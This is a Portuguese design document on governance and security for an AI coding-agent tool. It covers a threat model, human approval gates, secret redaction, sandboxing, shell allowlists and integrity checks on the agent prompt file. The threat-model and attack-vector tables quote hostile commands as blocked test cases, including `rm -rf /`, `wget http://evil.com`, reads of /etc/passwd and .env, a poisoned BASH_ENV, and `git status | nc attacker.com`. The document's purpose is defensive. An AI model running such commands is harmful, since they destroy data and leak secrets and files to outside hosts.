# GreenForge Agent — 05: Governança e Segurança

> **Status:** ✅ | **Versão:** 2.3 | **Data:** 2026-05-15

### 📋 Changelog v2.2 → v2.3 — Hardening Crítico de Segurança Terminal
| Vuln | Correção |
|---|---|
| #9 | CostGuardrail por papel: Árbitro ≤ 20% do perTaskBudgetTokens |
| #10 | TERMINAL_INIT path validation: contrato TypeScript completo |
| #11 | Shell allowlist hierárquica: subcomandos Git e NPM mapeados |
| #12 | AgentFactory: hash SHA-256 do system prompt body auditado por reload |

---

## 0. Modelo de Ameaças e Mitigações

> **Regra NEXUS:** Proteções implementadas devem ser declaradas como tabela ameaça → mitigação verificável.

| # | Ameaça | Vetor | Mitigação | Verificação |
|---|---|---|---|---|
| **T-01** | Agente modifica arquivo fora do projeto | Tool `write_file` com path absoluto externo | `assertPathWithinProject()` lança `Error` antes de qualquer escrita | Teste unitário: `write_file('/etc/passwd')` → exceção |
| **T-02** | Segredo exposto em log ou UI | Token SSE `AGENT_TOKEN` contém `GEMINI_API_KEY` | `redactSecrets()` aplicado em todos os outputs antes de emitir | `grep -r 'AIza' .greenforge/logs/` → 0 resultados |
| **T-03** | Comando shell arbitrário via `execute_shell` | Agente chama `rm -rf /` | `SHELL_ALLOWLIST` bloqueia; qualquer base-command não listado → `Error` imediato | Teste: `execute_shell('wget http://evil.com')` → `Error: Comando não permitido` |
| **T-04** | Merge destrutivo não reversível | Aprovação de Gate 2 com mudanças críticas | Rollback via `git revert HEAD` preserva histórico; botão visível 30 min | `git log` pós-rollback contém commit de revert |
| **T-05** | Vazamento de contexto entre worktrees | Agente lê arquivo do worktree do outro agente | `worktreePath` isolado por agente; `assertPathWithinProject()` usa o path do agente específico | Teste: agente propositor tenta `read_file` no path do critic → exceção |
| **T-06** | Execução de código gerado sem aprovação | Debate converge e merge acontece automaticamente | Gate 1 e Gate 2 são bloqueadores síncronos via `Promise` pendente; `APPROVAL_MODE=yolo` deve ser explícito | Com `APPROVAL_MODE=manual`: qualquer merge sem `HITL_DECISION {APPROVE}` → `Error` |
| **T-07** | Exaustão de quota da API por loop de agentes | AutoFixLimiter não funcionando | `AutoFixAttempt.attemptNumber <= 3` validado antes de cada retry; falha na 4ª → HITL Gate | Teste: forçar 4 erros → Gate exibido na 4ª tentativa, sem 5ª chamada LLM |
| **T-08** | Custo excessivo por chamada 1M tokens sem conhecimento do usuário | `LazyContextLoader` eleva budget silenciosamente | `CONTEXT_EXTENDED_BUDGET` só é usado após `HITL_GATE {gateType: 'COST_APPROVAL'}` aprovado | Teste: `contextBudget=1_000_000` sem gate → `Error: ExtendedBudgetRequiresApproval` |

### Fluxo de Aprovação WebSocket (Anti Race Condition)

```mermaid
sequenceDiagram
    participant Server as Agent Server
    participant SSE as SSETransport
    participant WS as WebSocketTransport
    participant UI as Browser UI
    actor U as Usuário

    Server->>Server: debate pause — aguarda Promise
    Server->>SSE: emit HITL_GATE {gateId, payload}
    SSE-->>UI: event: HITL_GATE
    UI->>U: exibe Approval Card
    Note over UI,U: Usuário expande Nível 2 (rationale)
    U->>UI: clica APROVAR
    UI->>WS: emit HITL_DECISION {gateId, decision: APPROVE}
    WS->>Server: resolveHITL(gateId, APPROVE)
    Server->>Server: Promise.resolve() — debate retoma
    Note over Server: Zero race condition — mesmo event loop, sem HTTP intermédio
```

---



O GreenForge v2.0 opera no modelo **single-user, localhost, sem autenticação**.

**Premissa de segurança:** Acesso físico ou via rede local à máquina hospedeira implica autorização de uso. O perímetro de segurança é o sistema operacional do usuário, não um formulário de login.

**Justificativa:** Autenticação em um MVP local adiciona fricção sem valor para o caso de uso primário (desenvolvedor individual em sua própria máquina). A arquitetura suporta adição de auth em versões futuras sem breaking changes (ver Roadmap: v3.0).

**O que o MVP não tem:**
- Formulário de login/senha
- OAuth / JWT de sessão de usuário
- RBAC (Role-Based Access Control)
- Auditoria de acesso por usuário

**O que o MVP tem:**
- Isolamento de execução via git worktrees (agentes não acessam fora do worktree)
- Sandbox Docker opcional para execução de código não confiável
- Política de redação de segredos em todos os logs e na UI
- HITL Gates obrigatórios para operações de alto risco

---

## 2. Modos de Aprovação

### 2.1 Definição dos Modos

| Modo | Comportamento | Caso de Uso |
|---|---|---|
| `manual` | Aprovação explícita para cada operação (Gate 0, 1 e 2 sempre ativos) | Trabalho em código de produção |
| `auto_edit` | Gate 1 ativo; Gate 2 auto-aprova chunks sem Red Flags | Desenvolvimento confiante |
| `yolo` | Sem gates — executa tudo automaticamente | CI/CD, scripts automatizados |

### 2.2 Red Flags que Sempre Requerem Aprovação Manual

Independente do `APPROVAL_MODE`, as operações abaixo sempre pausam para aprovação:

| Categoria | Operação | Severidade |
|---|---|---|
| **Destruição** | Deleção de arquivos (`rm`, `unlink`, `DELETE`) | 🔴 CRÍTICO |
| **Secrets** | Modificação de `.env`, `.env.local`, arquivos de secrets | 🔴 CRÍTICO |
| **Dependências** | Alteração de `package.json`, `go.mod`, `requirements.txt` | 🔴 CRÍTICO |
| **CI/CD** | Edição de `.github/workflows/`, `Dockerfile`, `docker-compose.yml` | 🔴 CRÍTICO |
| **Breaking Changes** | Mudanças em APIs públicas, schema de banco de dados | 🟠 ALTO |
| **Security Issues** | Qualquer issue com `severity: "high"` no debate | 🟠 ALTO |
| **Multi-arquivo** | Mudanças em mais de 5 arquivos simultaneamente | 🟡 MÉDIO |
| **Testes** | Deleção ou modificação de arquivos de teste | 🟡 MÉDIO |

### 2.3 ApprovalGate na UI Web — Validação com PreExecutionGuard (OCC + HMAC)

O mecanismo de aprovação na IDE usa WebSocket (Socket.IO) para garantir zero race condition entre o sinal de aprovação e a continuação do debate.

#### Fluxo Base (v2.2)

```typescript
// 1. Servidor emite via SSE: { type: 'HITL_GATE', gateId, payload }
// 2. UI exibe Approval Card
// 3. Usuário clica [APROVAR]
// 4. UI envia via WebSocket: { type: 'HITL_DECISION', gateId, decision: 'APPROVE' }
// 5. Servidor resolve a Promise suspensa e continua o debate

// O uso de WebSocket (não HTTP POST) garante que o sinal de aprovação
// chegue pelo mesmo canal bidirecional, sem enfileiramento HTTP.
```

#### PreExecutionGuard com Optimistic Concurrency Control (v2.3)

**Problema:** O protocolo base garante zero race condition no *sinal* de aprovação, mas não valida se o *estado do servidor* quando da execução corresponde ao estado que o usuário aprovou. Se o servidor muda estado via `STEER_AGENT` entre a emissão do gate (tempo T) e a aprovação (tempo T+Δ), o usuário aprova trade-offs de T mas código é gerado baseado em T+Δ.

**Solução:** Adicionar `resourceVersion` (stateHash + worktreeHash) + `epoch_id` + HMAC ao payload do gate.

```typescript
interface HITLGatePayload {
  gateId: string;
  payload: ApprovalCardData;
  // Novo em v2.3:
  stateHash: string;              // Hash SHA-256 do estado do debate em T
  worktreeHash: string;           // Hash dos arquivos do projeto em T
  epoch_id: number;               // Fencing token para invalidar gates pós-restart
  gateHMAC: string;               // HMAC do payload (detecta tampering de cliente)
}

// Geração do payload (no servidor):
function createGatePayload(
  gateId: string,
  data: ApprovalCardData,
  currentState: DebateState,
  worktreePath: string,
  epochId: number,
  hmacSecret: string
): HITLGatePayload {
  const stateHash = crypto.createHash('sha256')
    .update(JSON.stringify(currentState)).digest('hex');
  
  const worktreeHash = hashWorktreeState(worktreePath);
  
  const payload: HITLGatePayload = {
    gateId,
    payload: data,
    stateHash,
    worktreeHash,
    epoch_id: epochId,
    gateHMAC: '', // Será preenchido abaixo
  };
  
  // Serializa e calcula HMAC
  const payload_str = JSON.stringify(payload);
  payload.gateHMAC = crypto.createHmac('sha256', hmacSecret)
    .update(payload_str).digest('hex');
  
  return payload;
}

// Validação no momento de resolveHITL (no servidor):
function validateGateConsistency(
  gate: HITLGatePayload,
  currentState: DebateState,
  currentEpochId: number,
  worktreePath: string,
  hmacSecret: string
): { valid: boolean; reason?: string } {
  
  // 1. Valida epoch — gate de ciclo anterior é inválido (pós-restart)
  if (gate.epoch_id !== currentEpochId) {
    return { valid: false, reason: 'Gate inválido — servidor foi reinicializado' };
  }
  
  // 2. Valida HMAC — detecta tampering do cliente
  const expectedHMAC = crypto.createHmac('sha256', hmacSecret)
    .update(JSON.stringify({ ...gate, gateHMAC: '' })).digest('hex');
  
  if (gate.gateHMAC !== expectedHMAC) {
    return { valid: false, reason: 'HMAC inválido — payload foi modificado' };
  }
  
  // 3. Valida state hash — detecta mutações intra-época
  const currentStateHash = crypto.createHash('sha256')
    .update(JSON.stringify(currentState)).digest('hex');
  
  if (gate.stateHash !== currentStateHash) {
    // Estado mudou entre T (emissão) e T+Δ (aprovação)
    // Rejeita implicitamente — UI deve recarregar e solicitar nova aprovação
    return { 
      valid: false, 
      reason: `Estado do debate mudou desde a exibição do gate. Recarregue a página para reavaliar.` 
    };
  }
  
  // 4. Valida worktree hash — previne aprovação de gate baseado em artefatos desatualizados
  const currentWorktreeHash = hashWorktreeState(worktreePath);
  if (gate.worktreeHash !== currentWorktreeHash) {
    return { 
      valid: false, 
      reason: `Arquivos do projeto foram alterados. Gate inválido — recarregue a página.` 
    };
  }
  
  return { valid: true };
}

// Integração em resolveHITL:
async function resolveHITL(
  gateId: string,
  decision: 'APPROVE' | 'REJECT',
  gate: HITLGatePayload,
  serverState: ServerState
): Promise<void> {
  
  const validation = validateGateConsistency(
    gate,
    serverState.currentDebateState,
    serverState.currentEpochId,
    serverState.worktreePath,
    serverState.hmacSecret
  );
  
  if (!validation.valid) {
    // Rejeita aprovação com mensagem de erro clara
    sseTransport.emitSystemAlert('GATE_VALIDATION_FAILED', {
      gateId,
      reason: validation.reason,
      severity: 'WARN',
    });
    return;
  }
  
  // Gate passou na validação — prossegue com a aprovação
  if (decision === 'APPROVE') {
    await continueDebate(gate.payload);
  } else {
    await abortDebate('Usuário rejeitou o gate');
  }
}
```

---

## 3. Política de Redação de Segredos

### 3.1 Pontos de Aplicação

Quando `SECRET_REDACTION_ENABLED=true` (padrão), as seguintes strings são redatadas antes de qualquer log ou exibição na UI:

```typescript
const SECRET_PATTERNS = [
  /GEMINI_API_KEY=\S+/gi,
  /Authorization:\s*Bearer\s+\S+/gi,
  /password['":\s]+\S+/gi,
  /secret['":\s]+\S+/gi,
  /token['":\s]+[A-Za-z0-9\-_]{20,}/gi,
  /sk-[A-Za-z0-9]{20,}/g,       // OpenAI keys
  /AIza[A-Za-z0-9\-_]{35}/g,    // Google API keys
];

function redactSecrets(text: string): string {
  return SECRET_PATTERNS.reduce(
    (acc, pattern) => acc.replace(pattern, '[REDACTED]'),
    text
  );
}
```

### 3.2 Pontos de Aplicação Obrigatórios

- `LLMCallLog.prompt` e `LLMCallLog.response` — antes de persistir no DB
- Eventos SSE (`AGENT_TOKEN`, `DEBATE_STATUS`) — antes de emitir ao browser
- Output do terminal (PTY stdout) — antes de enviar via WebSocket
- Logs do servidor (stdout/stderr do processo Node.js)

---

## 4. Sandbox de Execução

### 4.1 Modo Local (padrão do MVP)

```
SANDBOX_MODE=local

Comportamento:
  - Agentes executam comandos shell diretamente no worktree (processo filho)
  - Proteção: assertPathWithinProject() valida que qualquer operação de FS
    está dentro do worktree do agente
  - Proteção: SHELL_ALLOWLIST restringe comandos executáveis
  - Sem isolamento de rede ou recursos de CPU/RAM
```

### 4.2 Modo Docker (recomendado para staging/CI)

```yaml
# docker-compose.greenforge.yml
services:
  agent_proposer:
    image: greenforge-agent:latest
    read_only: true               # Filesystem root é read-only
    tmpfs:
      - /tmp:size=512m            # Escrita apenas em /tmp
    volumes:
      - ./worktrees/proposer:/workspace:rw  # Apenas o worktree
    cap_drop:
      - ALL                       # Remove todas as Linux capabilities
    cap_add:
      - CHOWN
      - DAC_OVERRIDE              # Mínimo necessário
    security_opt:
      - no-new-privileges:true    # Previne escalação de privilégios
    mem_limit: 512m
    cpus: "0.5"
    network_mode: none            # Sem acesso à rede externa
```

### 4.3 Shell & Environment Hardening (Audit v2.1)

A execução de comandos shell agora segue um protocolo de **defesa em profundidade**, prevenindo bypasses via injeção de argumentos ou variáveis de ambiente envenenadas (ex: CVE-2026-22708).

#### Camada 1: Sanitização de Ambiente (Allowlist Estrita)
O servidor descarta todas as variáveis de ambiente herdadas, exceto uma allowlist explícita. Vetores de injeção como `BASH_ENV`, `ENV`, `LD_PRELOAD` e `IFS` são bloqueados no nível de spawn do PTY.

```typescript
const ENV_ALLOWLIST = ['PATH', 'HOME', 'USER', 'NODE_ENV', 'TERM', 'LANG'];
```

#### Camada 2: Validação de Path Traversal
Toda inicialização de terminal (`TERMINAL_INIT`) exige um `worktreePath`. O servidor valida se o path resolvido está dentro de `AUTHORIZED_WORKTREES_ROOT`.

```typescript
// v2.2 — vuln #10: contrato completo com disconexion e log de auditoria
import * as path from 'path';

function validateWorktreePath(worktreePath: string): string {
  const authorizedRoot = process.env.AUTHORIZED_WORKTREES_ROOT;
  if (!authorizedRoot) {
    throw new SecurityError('AUTHORIZED_WORKTREES_ROOT não configurado. Servidor não pode iniciar PTY.');
  }
  const resolvedPath = path.resolve(worktreePath);
  const resolvedRoot = path.resolve(authorizedRoot);
  if (!resolvedPath.startsWith(resolvedRoot + path.sep) && resolvedPath !== resolvedRoot) {
    // Registra no AuditLog antes de rejeitar
    void prisma.auditLog.create({
      data: { entityType: 'SecurityViolation', entityId: 'TERMINAL_INIT',
              action: 'PATH_TRAVERSAL_BLOCKED', actor: 'system',
              newState: JSON.stringify({ attempted: worktreePath, resolved: resolvedPath }) }
    });
    throw new SecurityError(`Path traversal detectado: '${resolvedPath}' fora de '${resolvedRoot}'.`);
  }
  return resolvedPath;
}
```

#### Camada 3: Allowlist Hierárquica de Subcomandos
Não basta permitir o binário `git`. É necessário validar subcomandos e flags.

> **v2.2 — vuln #11:** A validação anterior verificava apenas o comando base. Agora valida subcomandos e flags explícitos por allowlist, bloqueando vetores como `git config --global core.hooksPath`.

| Binário | Subcomandos Permitidos | Subcomandos/Flags Bloqueados |
|---|---|---|
| `git` | `status`, `diff`, `add`, `commit`, `checkout`, `branch`, `merge`, `rebase`, `stash`, `revert`, `log`, `show` | `clone`, `config`, `worktree add`, `--upload-pack`, `--receive-pack`, `--global` |
| `npm` | `install`, `test`, `run`, `build`, `ci` | `--prefix`, `--global`, `--workspaces`, `publish` |

```typescript
// v2.2 — vuln #11: allowlist hierárquica com validação de subcomandos
const SHELL_ALLOWLIST: Record<string, { allowed: string[]; blocked: string[] }> = {
  git: {
    allowed: ['status', 'diff', 'add', 'commit', 'checkout', 'branch', 'merge',
              'rebase', 'stash', 'revert', 'log', 'show'],
    blocked: ['clone', 'config', 'worktree', '--upload-pack', '--receive-pack', '--global'],
  },
  npm: {
    allowed: ['install', 'test', 'run', 'build', 'ci'],
    blocked: ['publish', '--global', '--prefix', '--workspaces'],
  },
};
```

#### secureGit Wrapper com AST Parsing (v2.3 — Resolução de Vulnerabilidade #4)

**Problema:** O allowlist hierárquico bloqueia subcomandos globais (ex: `git config`), mas não previne path traversal dentro dos argumentos. Vetores como `git show HEAD:../../etc/passwd` e `git diff -- ../../.env` contornam a validação porque:
1. Subcomando `show` e `diff` estão na allowlist
2. A validação v2.2 não analisa o conteúdo dos argumentos
3. Git interpreta paths relativos: `HEAD:../../etc/passwd` escapa do worktree

**Solução:** Implementar secureGit Wrapper que:
1. Parseia o comando shell em AST completo (via `tree-sitter` shell grammar)
2. Valida subcomandos contra allowlist
3. Para cada subcomando, aplica regras específicas de pathArgs
4. Bloqueia command expansion, process substitution, e pipes não autorizados
5. Sanitiza variáveis de ambiente antes de exec

```typescript
import * as fs from 'fs';
import * as path from 'path';
import { exec } from 'child_process';
import Parser from 'tree-sitter';
import Language from 'tree-sitter-bash';

// Definir semântica de validação de paths para cada subcomando
interface GitSubcommandPolicy {
  allowPaths: boolean;               // Se pode aceitar argumentos path
  pathRestriction: 'WITHIN_WORKTREE' | 'BRANCHES_ONLY' | 'NONE';
  allowedRefPatterns: RegExp[];       // ex: /^HEAD/, /^refs\/heads\//
  allowedPathPatterns: RegExp[];      // ex: /^[a-zA-Z0-9._\/-]+$/
  blockedPathPatterns: RegExp[];      // ex: /^\.\.\//, /^\//, /^~\//
}

const GIT_SUBCOMMAND_POLICY: Record<string, GitSubcommandPolicy> = {
  status: {
    allowPaths: false,
    pathRestriction: 'NONE',
    allowedRefPatterns: [],
    allowedPathPatterns: [],
    blockedPathPatterns: []
  },
  diff: {
    allowPaths: true,
    pathRestriction: 'WITHIN_WORKTREE',
    allowedRefPatterns: [/^HEAD$/, /^HEAD~\d+$/, /^refs\/heads\/.+/],
    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/, /^\.\/[a-zA-Z0-9._\/-]+$/],
    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//, /^~\w+\//]
  },
  show: {
    allowPaths: true,
    pathRestriction: 'BRANCHES_ONLY',  // Somente refs, não paths locais
    allowedRefPatterns: [/^HEAD(:[^:]+)?$/, /^refs\/heads\/.+/],
    allowedPathPatterns: [],  // show NÃO aceita paths locais, apenas refs
    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//, /:.+\.\.\//]  // Bloqueia HEAD:../../file
  },
  log: {
    allowPaths: true,
    pathRestriction: 'BRANCHES_ONLY',
    allowedRefPatterns: [/^HEAD$/, /^refs\/.+/, /^--all/],
    allowedPathPatterns: [],
    blockedPathPatterns: [/^--remotes/, /^--glob=/, /:..\//]  // Bloqueia --remotes, glob patterns
  },
  add: {
    allowPaths: true,
    pathRestriction: 'WITHIN_WORKTREE',
    allowedRefPatterns: [],
    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/, /^\.\/[a-zA-Z0-9._\/-]+$/],
    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//]
  },
  commit: {
    allowPaths: true,
    pathRestriction: 'WITHIN_WORKTREE',
    allowedRefPatterns: [],
    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/, /^\.\/[a-zA-Z0-9._\/-]+$/],
    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//]
  },
  checkout: {
    allowPaths: true,
    pathRestriction: 'BRANCHES_ONLY',
    allowedRefPatterns: [/^HEAD~\d+$/, /^refs\/heads\/.+/, /^[a-zA-Z0-9_-]+$/],  // Branch names only
    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/],  // Paths local OK
    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//]
  },
};

// Parser AST via tree-sitter
const parser = new Parser();
parser.setLanguage(Language);

function parseShellCommand(cmdStr: string) {
  const tree = parser.parse(cmdStr);
  return tree.rootNode;
}

// Validação de AST com tree-sitter
function validateGitCommand(cmdStr: string, worktreePath: string): boolean {
  try {
    const ast = parseShellCommand(cmdStr);
    
    // Bloqueia command expansion, process substitution, pipes
    validateASTNodeSafety(ast);
    
    // Extrai comando e subcomando
    const [gitBinary, subcommand, ...args] = extractCommandParts(ast);
    
    if (gitBinary !== 'git') {
      throw new Error(`Esperava 'git', recebeu '${gitBinary}'`);
    }
    
    if (!subcommand) {
      throw new Error('Subcomando ausente');
    }
    
    const policy = GIT_SUBCOMMAND_POLICY[subcommand];
    if (!policy) {
      throw new Error(`Subcomando '${subcommand}' não permitido`);
    }
    
    // Valida argumentos de path conforme a política
    if (policy.allowPaths) {
      for (const arg of args) {
        if (arg.startsWith('-')) continue;  // Skip flags
        
        // Valida contra padrões bloqueados
        for (const blocked of policy.blockedPathPatterns) {
          if (blocked.test(arg)) {
            throw new Error(
              `Path bloqueado para 'git ${subcommand}': '${arg}' corresponde ${blocked.toString()}`
            );
          }
        }
        
        // Valida contra padrões permitidos (se houver)
        if (policy.allowedPathPatterns.length > 0) {
          const matches = policy.allowedPathPatterns.some(p => p.test(arg));
          if (!matches) {
            throw new Error(
              `Path não permitido para 'git ${subcommand}': '${arg}'`
            );
          }
        }
        
        // Para restriction WITHIN_WORKTREE, resolve path e valida
        if (policy.pathRestriction === 'WITHIN_WORKTREE') {
          const resolved = path.resolve(worktreePath, arg);
          if (!resolved.startsWith(path.resolve(worktreePath) + path.sep)) {
            throw new Error(
              `Path escapa do worktree: '${arg}' → '${resolved}'`
            );
          }
        }
      }
    }
    
    return true;
  } catch (err) {
    console.error(`[secureGit] Validação falhou: ${(err as Error).message}`);
    return false;
  }
}

// Detecta nós perigosos no AST
function validateASTNodeSafety(node: any): void {
  // Bloqueia CommandExpansion ($(...)  ou `...`)
  if (node.type === 'command_substitution') {
    throw new Error('Command expansion não permitida');
  }
  
  // Bloqueia ProcessSubstitution (<(...) ou >(...)
  if (node.type === 'process_substitution') {
    throw new Error('Process substitution não permitida');
  }
  
  // Bloqueia pipes (|, |&)
  if (node.type === 'pipeline') {
    throw new Error('Pipes não permitidas');
  }
  
  // Bloqueia background execution (&)
  if (node.type === 'background') {
    throw new Error('Background execution não permitida');
  }
  
  // Recursivamente valida filhos
  for (const child of node.children ?? []) {
    validateASTNodeSafety(child);
  }
}

// Extrai [binary, subcomando, ...args] do AST
function extractCommandParts(node: any): string[] {
  const parts: string[] = [];
  
  function traverse(n: any) {
    if (n.type === 'simple_command' || n.type === 'command') {
      for (const child of n.children ?? []) {
        if (child.type === 'command_name' || child.type === 'word') {
          parts.push(child.text);
        }
      }
    } else {
      for (const child of n.children ?? []) {
        traverse(child);
      }
    }
  }
  
  traverse(node);
  return parts;
}

// Sanitização de Variáveis de Ambiente
const ENV_BLOCKLIST = [
  'BASH_ENV', 'ENV', 'LD_PRELOAD', 'LD_LIBRARY_PATH',
  'DYLD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES',
  'IFS', 'CDPATH', 'PS1', 'PS2',
  'HISTFILE', 'HISTCONTROL',
  'MANPATH', 'INFOPATH',
];

function sanitizeEnv(): NodeJS.ProcessEnv {
  const cleanEnv: NodeJS.ProcessEnv = {};
  const allowlist = ['PATH', 'HOME', 'USER', 'NODE_ENV', 'TERM', 'LANG'];
  
  for (const key of allowlist) {
    if (process.env[key]) {
      cleanEnv[key] = process.env[key];
    }
  }
  
  // Remove todos os blocklist vars explicitamente
  for (const blocked of ENV_BLOCKLIST) {
    delete cleanEnv[blocked];
  }
  
  return cleanEnv;
}

// Wrapper final
async function executeSecureGit(
  cmdStr: string,
  worktreePath: string
): Promise<string> {
  // 1. Valida AST + allowlist
  if (!validateGitCommand(cmdStr, worktreePath)) {
    throw new Error(`[secureGit] Comando bloqueado: ${cmdStr}`);
  }
  
  // 2. Sanitiza ambiente
  const cleanEnv = sanitizeEnv();
  
  // 3. Executa com umask restritivo
  const oldUmask = process.umask(0o077);  // rwx------ permissions only
  
  try {
    return new Promise((resolve, reject) => {
      exec(cmdStr, {
        cwd: worktreePath,
        env: cleanEnv,
        timeout: 30000,  // 30s timeout
        maxBuffer: 1024 * 1024,  // 1MB stdout max
      }, (error, stdout, stderr) => {
        if (error) {
          reject(new Error(`[secureGit] Execução falhou: ${stderr}`));
        } else {
          resolve(stdout);
        }
      });
    });
  } finally {
    process.umask(oldUmask);
  }
}

// Export para uso em debug, state mutation, PTY executions
export { executeSecureGit, validateGitCommand };
```

#### Impacto de Segurança (v2.3)

| Vetor de Ataque | v2.2 | v2.3 | Validação |
|---|---|---|---|
| `git show HEAD:../../etc/passwd` | ❌ Passa allowlist | ✅ Bloqueado | AST parsing + regex `:..\//` |
| `git log --remotes` | ❌ Passa allowlist | ✅ Bloqueado | Regex `/^--remotes/` em policy |
| `git diff -- ../../.env` | ❌ Passa allowlist | ✅ Bloqueado | Path traversal detection |
| `git config --global core.hooksPath` | ❌ Passa allowlist | ✅ Bloqueado | Subcomando `config` removido |
| `BASH_ENV=/tmp/evil.sh git add` | ❌ Executa | ✅ Bloqueado | Sanitização de ENV |
| `git status \| nc attacker.com` | ❌ Passa allowlist | ✅ Bloqueado | AST bloqueia pipes |

---

## 5. Rollback Pós-Merge

### 5.1 Mecanismo

```typescript
// src/server/GitWorktreeManager.ts — método revert

async revert(mergeEventId: string): Promise<void> {
  // 1. Executa git revert HEAD (não-destrutivo, preserva histórico)
  execSync(`git -C ${this.mainRepoPath} revert HEAD --no-edit`);

  // 2. Atualiza o DB
  await prisma.mergeEvent.update({
    where: { id: mergeEventId },
    data: { revertedAt: new Date() },
  });

  // 3. Emite evento SSE para atualizar a Timeline na UI
  sseTransport.emitDebateEvent(sessionId, {
    id: nextEventId(),
    type: 'MERGE_REVERTED',
    payload: { mergeEventId, revertedAt: new Date().toISOString() },
  });
}
```

### 5.2 Janela de Rollback

- **30 minutos** após merge: botão "↩ Desfazer" visível na Timeline Lateral
- **Após 30 minutos**: botão movido para seção "Histórico de Ações" (sempre acessível)
- **Configurável** via `ROLLBACK_WINDOW_MIN` no `.env`

### 5.3 Conflito no Revert

Se `git revert HEAD` gerar conflito (raro, mas possível em repositórios com commits posteriores):

```bash
# 1. Cancelar o revert em andamento
git revert --abort

# 2. Usar o terminal integrado para resolver manualmente
# 3. Ou iniciar uma nova sessão de debate para "refazer" de forma limpa
```

---

## 6. Gestão de API Keys

### 6.1 Provedor Piloto: Google AI Studio

```bash
# .env (nunca commitar — está no .gitignore)
GEMINI_API_KEY=AIza...

# A key é lida UMA VEZ na inicialização do GeminiProvider
# Nunca é logada, nunca é enviada ao browser, nunca aparece nos eventos SSE
```

### 6.2 LocalKeyVault (para múltiplas keys futuras)

```typescript
// Baseado na v1.0 — AES-CBC 256-bit
// Armazena keys criptografadas em .greenforge/vault.enc
// Desbloqueado por passphrase do usuário na inicialização
// NÃO implementado no MVP (single-user, localhost)
// Previsto para v2.3 (multi-usuário)
```

### 6.3 Estratégia para Ollama (local LLM)

Quando `OLLAMA_ENABLED=true`:
- Sem API key necessária — Ollama roda em `localhost:11434`
- Backend Node.js faz requests diretos (sem CORS, sem PNA policy)
- `ILLMProvider` é trocado para `OllamaProvider` sem alterar lógica dos agentes

---

## 7. Política de CostGuardrail

```typescript
// v2.2 — vuln #9: CostGuardrail com limite por papel
interface CostGuardrailConfig {
  dailyBudgetUsd: number;           // Default: 5.00
  perTaskBudgetTokens: number;      // Default: 50_000 tokens
  extendedBudgetRequiresGate: boolean; // Default: true
  // v2.2: limite por papel — impede Arbitro Pro de consumir 80%+ do budget
  roleBudgetRatio: {
    judge: number;    // Default: 0.20 (20% do perTaskBudgetTokens)
    proposer: number; // Default: 0.50 (50%)
    critic: number;   // Default: 0.30 (30%)
  };
  // v2.2: verifica budget disponível ANTES de iniciar geração pós-Gate 1
  preGenerationBudgetCheck: boolean; // Default: true
}

// Comportamento ao atingir limite por papel:
// judge excede 20% → emite HITL Gate 'ROLE_BUDGET_EXCEEDED' antes de nova chamada Pro
// Comportamento ao atingir limite geral:
// 1. dailyBudget atingido → pausa todas as sessões, notifica usuário via SSE
// 2. perTaskBudget atingido → aborta a task atual, registra no DB
// 3. Pedido de 1M tokens → HITL Gate de custo ("Esta análise custa ~$0.42. Aprovar?")
```

---

## 9. Integridade do AGENTS.md

Para prevenir o envenenamento de prompts (Prompt Injection via Filesystem), o `AgentFactory` monitora a integridade do arquivo `AGENTS.md`.

- **Hashing:** No boot, o servidor calcula o SHA-256 de `AGENTS.md` e registra no `AuditLog`.
- **Hot-Reload Seguro:** O `chokidar` monitora alterações. Qualquer mudança dispara uma re-validação completa.
- **v2.2 — vuln #12:** Além do hash do arquivo inteiro, o hash SHA-256 do **system prompt body** de cada agente core (`proposer`, `critic`, `judge`) é calculado individualmente e comparado entre reloads. Qualquer mudança no body de um agente core gera um alerta `AGENT_INTEGRITY_CHANGED` via SSE e uma entrada no `AuditLog` com os hashes anterior e novo.

```typescript
// v2.2 — vuln #12: audit de integridade por agente core
async function auditAgentIntegrity(agentId: string, systemPrompt: string, previousHash?: string): Promise<void> {
  const newHash = crypto.createHash('sha256').update(systemPrompt).digest('hex');
  await prisma.auditLog.create({
    data: {
      entityType: 'AgentIntegrity', entityId: agentId,
      action: 'RELOAD',
      previousState: previousHash ? JSON.stringify({ promptHash: previousHash }) : null,
      newState: JSON.stringify({ promptHash: newHash }),
      actor: 'system:AgentFactory',
    }
  });
  if (previousHash && previousHash !== newHash) {
    const coreAgents = ['technical_proposer', 'quality_critic', 'debate_judge'];
    if (coreAgents.includes(agentId)) {
      sseTransport.emitSystemAlert('AGENT_INTEGRITY_CHANGED', {
        agentId, previousHash, newHash,
        severity: 'HIGH',
        message: `System prompt do agente core '${agentId}' foi alterado. Verifique o AGENTS.md.`
      });
    }
  }
}
```

- **Audit Trail:** Cada alteração no arquivo gera um diff auditável no banco de dados, registrando o timestamp e o hash anterior/novo.
- **Failsafe:** Se o parse do novo YAML falhar, o servidor mantém os agentes anteriores em memória e emite um alerta `AGENT_FACTORY_RELOAD_FAILED` via SSE.

### Checklist de Segurança por Perfil (v2.1)

#### Dev Júnior
- [ ] Usar `APPROVAL_MODE=manual` sempre
- [ ] Nunca commitar `.env` ou `.greenforge/`
- [ ] Verificar Red Flags antes de aprovar qualquer Gate
- [ ] Não desabilitar `SECRET_REDACTION_ENABLED`

#### Dev Sênior / Tech Lead
- [ ] Definir `APPROVAL_MODE` padrão para o projeto (recomendado: `auto_edit`)
- [ ] Configurar `SANDBOX_MODE=docker` em CI/CD
- [ ] Revisar `SHELL_ALLOWLIST` e subcomandos permitidos
- [ ] Monitorar integridade do `AGENTS.md` via `AuditLog`
- [ ] Configurar `DAILY_BUDGET_USD` compatível com a cota do Google AI Studio

#### DevOps / SRE
- [ ] Validar `AUTHORIZED_WORKTREES_ROOT` e permissões de filesystem
- [ ] Monitorar `LLMCallLog` para anomalias de custo/latência
- [ ] Verificar logs do `EventOutbox` para erros de sincronização
- [ ] Agendar cleanup de `ResourceLease` expirados via cron
- [ ] Garantir que `SERVER_PORT` não está exposto externamente sem VPN/Auth
